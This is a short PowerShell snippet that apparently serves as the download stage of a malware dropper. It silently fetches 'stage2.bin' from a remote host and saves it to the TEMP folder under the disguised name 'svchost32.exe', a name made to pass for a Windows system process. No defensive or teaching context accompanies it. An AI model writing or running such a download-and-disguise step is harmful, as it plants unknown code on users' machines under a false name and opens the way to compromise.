$PayloadUrl = "https://adatum.com/stage2.bin"
$OutputPath = "$env:TEMP\svchost32.exe"
curl.exe -s -L -o $OutputPath $PayloadUrl
$ProgressPreference = "SilentlyContinue"
